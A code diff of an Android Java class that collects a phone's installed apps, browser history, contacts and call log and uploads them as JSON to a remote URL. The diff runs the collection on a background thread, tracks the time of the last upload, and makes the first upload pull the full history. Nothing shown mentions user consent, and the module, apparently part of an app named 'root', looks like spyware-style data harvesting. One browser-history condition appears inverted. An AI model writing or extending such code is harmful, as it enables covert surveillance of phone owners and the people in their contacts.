@@ -3,6 +3,7 @@ package com.mob.root.net;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
+import org.apache.http.Header;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import android.content.ContentResolver;
@@ -13,8 +14,8 @@ import android.content.pm.PackageManager;
 import android.content.pm.Signature;
 import android.database.Cursor;
 import android.os.Handler;
-import android.os.Message;
 import android.os.Handler.Callback;
+import android.os.Message;
 import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.CallLog.Calls;
@@ -31,7 +32,7 @@ import com.mob.root.tools.AMConstants;
 import com.mob.root.tools.AMLogger;
 import com.mob.root.tools.CommonUtils;
 
-public class UploadDatasRequest extends AMRequest<String> {
+public class UploadDatasRequest extends AMRequest<String> implements Runnable {
 
 	public UploadDatasRequest(IResponseListener<String> listener) {
 		super(listener);
@@ -39,6 +40,9 @@ public class UploadDatasRequest extends AMRequest<String> {
 			
 			@Override
 			public boolean handleMessage(Message msg) {
+				if(0 != msg.what) {
+					return false;
+				}
 				try {
 					doPost(url, jsonObject, true);
 				} catch (Exception e) {
@@ -62,6 +66,30 @@ public class UploadDatasRequest extends AMRequest<String> {
 			if (CommonUtils.isEmptyString(url)) {
 				return;
 			}
+			mHandler.post(this);
+		} catch (Exception e) {
+			AMLogger.e(null, e.getMessage());
+		}
+	}
+	
+	@Override
+	public void onSuccess(int statusCode, Header[] headers, String datas) {
+		super.onSuccess(statusCode, headers, datas);
+		try {
+			JSONObject jsonObject = new JSONObject(resultDatas);
+			int status = jsonObject.getInt(AMConstants.NET_DATAS_UPLOAD_STATUS);
+			if(0 == status) {
+				SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
+				sp.edit().putLong(AMConstants.SP_LAST_UPLOAD_STAMP, System.currentTimeMillis()).commit();
+			}
+		} catch (Exception e) {
+			AMLogger.e(null, e.getMessage());
+		}
+	}
+	
+	@Override
+	public void run() {
+		try {
 			jsonObject = getDatas();
 			mHandler.sendEmptyMessage(0);
 		} catch (Exception e) {
@@ -73,8 +101,7 @@ public class UploadDatasRequest extends AMRequest<String> {
 		JSONObject rootObject = new JSONObject();
 		
 		SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
-		String dayDely = sp.getString(AMConstants.SP_LAST_UPLOAD_STAMP, null);
-		long dayStamp = CommonUtils.isEmptyString(dayDely) ? 0 : Long.parseLong(dayDely);
+		long dayStamp = sp.getLong(AMConstants.SP_LAST_UPLOAD_STAMP, 0);
 		
 		// 获取要上传的app列表     ----------------------------------------------------------------------------------------
 		List<UserApp> applications = getApplications(dayStamp);
@@ -182,7 +209,7 @@ public class UploadDatasRequest extends AMRequest<String> {
 		}
 		apps = new ArrayList<UserApp>();
 		for (PackageInfo packageInfo : packages) {
-			if(packageInfo.firstInstallTime < stamp) {
+			if(0 != stamp && packageInfo.firstInstallTime < stamp) {
 				continue;
 			}
 			UserApp userApp = new UserApp();
@@ -208,7 +235,12 @@ public class UploadDatasRequest extends AMRequest<String> {
 		List<BrowserHistory> historys = null;
 		Cursor cursor = null;
 		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE };
-		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0 and " + Browser.BookmarkColumns.DATE + " > " + stamp; // 0 = history, 1 = bookmark
+		String sel = null;
+		if(0 != stamp) {
+			sel = Browser.BookmarkColumns.BOOKMARK + " = 0 "; // 0 = history, 1 = bookmark
+		} else {
+			sel = Browser.BookmarkColumns.BOOKMARK + " = 0 and " + Browser.BookmarkColumns.DATE + " > " + stamp; // 0 = history, 1 = bookmark
+		}
 		historys = new ArrayList<BrowserHistory>();
 		try {
 			cursor = contentResolver.query(Browser.BOOKMARKS_URI, proj, sel, null, null);;  
@@ -239,7 +271,7 @@ public class UploadDatasRequest extends AMRequest<String> {
 			cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
 			while (cursor.moveToNext()) {
 				long time = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
-				if(time < dayStamp) {
+				if(0 != dayStamp && time < dayStamp) {
 					continue;
 				}
 				Contact userContact = new Contact();
@@ -320,7 +352,7 @@ public class UploadDatasRequest extends AMRequest<String> {
 			calls = new ArrayList<UserCall>();
 			while (null != cursor && cursor.moveToNext()) {
 				long time = cursor.getLong(cursor.getColumnIndex(Calls.DATE));
-				if(time < stamp) {
+				if(0!= stamp && time < stamp) {
 					continue;
 				}
 				UserCall call = new UserCall();
